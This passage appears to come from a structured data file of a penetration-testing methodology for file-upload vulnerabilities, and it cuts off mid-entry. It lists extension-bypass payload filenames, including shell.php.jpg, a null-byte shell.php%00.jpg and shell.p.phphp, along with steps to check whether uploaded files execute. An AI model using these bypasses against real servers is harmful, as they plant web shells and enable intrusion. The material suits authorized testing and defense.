bucket).","Test if uploaded files are accessible without authentication.","Determine server technology from headers (Server:, X-Powered-By:, response timing)."],note:"The baseline error message IS your oracle. Different response = different server behavior = potential bypass."},{id:"M003",name:"Phase 3: Extension Bypass Testing",risk:"High",server:"All",description:"Systematically test all extension bypass techniques.",steps:["Test all C001 extensions for target server type (PHP: .php3, .php5, .phtml, .pht, .phar, etc.)","Test case sensitivity: .PHP, .pHp, .PhP (C002-T001)","Test double extensions: shell.php.jpg, shell.jpg.php (C002-T002)","Test null byte: shell.php%00.jpg (C002-T003)","Test trailing characters: shell.php. shell.php%20 (C002-T004)","Test recursive bypass: shell.p.phphp (C002-T011)","Use Burp Intruder Sniper mode with extension wordlist (C021-B003)","For each accepted extension: immediately test if file executes."]},{id:"M004",name:"Phase 4: Content Validation Bypass",risk:"High",server:"All",description:"Bypass content-type and file content
